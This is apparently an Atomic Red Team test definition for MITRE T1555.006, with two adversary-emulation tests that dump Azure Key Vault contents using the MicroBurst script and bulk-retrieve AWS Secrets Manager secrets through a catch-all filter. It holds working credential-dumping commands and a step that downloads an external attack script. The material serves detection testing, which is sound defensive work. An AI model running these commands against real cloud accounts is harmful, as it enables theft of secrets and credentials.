attack_technique: T1555.006
display_name: 'Credentials from Password Stores: Cloud Secrets Management Stores'
atomic_tests:
- name: Azure - Dump All Azure Key Vaults with Microburst
  auto_generated_guid: 1b83cddb-eaa7-45aa-98a5-85fb0a8807ea
  description: |-
    Upon successful execution of this test, the names, locations, and contents of key vaults within an Azure account will be output to a file.
    See - https://www.netspi.com/blog/technical/cloud-penetration-testing/a-beginners-guide-to-gathering-azure-passwords/
  supported_platforms:
  - iaas:azure
  input_arguments:
    username:
      description: Azure AD username
      type: string
      default:
    password:
      description: Azure AD password
      type: string
      default: T1082Az
    output_file:
      description: File to dump results to
      type: string
      default: $env:temp\T1528Test1.txt
    subscription_id:
      description: Azure subscription id to search
      type: string
      default:
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The Get-AzurePasswords script must exist in PathToAtomicsFolder\..\ExternalPayloads.
    prereq_command: |
      if (test-path "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"){exit 0} else {exit 1}
    get_prereq_command: |
      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
      invoke-webrequest "https://raw.githubusercontent.com/NetSPI/MicroBurst/c771c665a2c71f9c5ba474869cd1c211ebee68fd/AzureRM/Get-AzurePasswords.ps1" -outfile "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
  - description: |
      The Azure RM module must be installed.
    prereq_command: |
      try {if (Get-InstalledModule -Name AzureRM -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
    get_prereq_command: |
      Install-Module -Name AzureRM -Force -allowclobber
  - description: |
      The Azure module must be installed.
    prereq_command: |
      try {if (Get-InstalledModule -Name Azure -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}
    get_prereq_command: |
      Install-Module -Name Azure -Force -allowclobber
  executor:
    command: |
      import-module "PathToAtomicsFolder\..\ExternalPayloads\Get-AzurePasswords.ps1"
      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
      Connect-AzureRmAccount -Credential $Credential
      Get-AzurePasswords -subscription '#{subscription_id}' > #{output_file}
      cat #{output_file}
    cleanup_command: |
      remove-item #{output_file} -force -erroraction silentlycontinue
    name: powershell
    elevation_required: true
- name: AWS - Bulk Retrieve Secrets Manager Secrets with BatchGetSecretValue
  auto_generated_guid: 57ffa0d7-94de-4b68-8836-897c14e83d23
  description: |
    Emulates bulk credential theft from AWS Secrets Manager. With secretsmanager:BatchGetSecretValue and secretsmanager:ListSecrets, an adversary retrieves many secret values in a single API call by supplying a catch all tag filter, instead of iterating GetSecretValue per secret. This lowers API call volume and speeds exfiltration. Two throwaway secrets are created so the sweep returns data, then removed during cleanup.
    Reference: https://stratus-red-team.cloud/attack-techniques/AWS/aws.credential-access.secretsmanager-batch-retrieve-secrets/
  supported_platforms:
  - iaas:aws
  input_arguments:
    region:
      description: AWS region to target
      type: string
      default: us-east-1
    secret_name:
      description: Base name for the throwaway secrets created for this test
      type: string
      default: atomic-red-team-T1555006
    nonexistent_tag:
      description: Tag key that no secret has, used to build a catch all filter that matches every secret
      type: string
      default: atomic-red-team-no-match
  dependency_executor_name: sh
  dependencies:
  - description: |
      The aws cli must be installed and AWS credentials or a profile configured.
    prereq_command: |
      aws sts get-caller-identity > /dev/null 2>&1
    get_prereq_command: |
      echo "install the aws cli and run: aws configure"
  executor:
    command: |
      aws secretsmanager create-secret --name "#{secret_name}-1" --secret-string "atomic-dummy-value-1" --region #{region} > /dev/null
      aws secretsmanager create-secret --name "#{secret_name}-2" --secret-string "atomic-dummy-value-2" --region #{region} > /dev/null
      aws secretsmanager batch-get-secret-value --filters "Key=tag-key,Values=!#{nonexistent_tag}" --region #{region}
    cleanup_command: |
      aws secretsmanager delete-secret --secret-id "#{secret_name}-1" --force-delete-without-recovery --region #{region} > /dev/null 2>&1
      aws secretsmanager delete-secret --secret-id "#{secret_name}-2" --force-delete-without-recovery --region #{region} > /dev/null 2>&1
    name: sh
    elevation_required: false
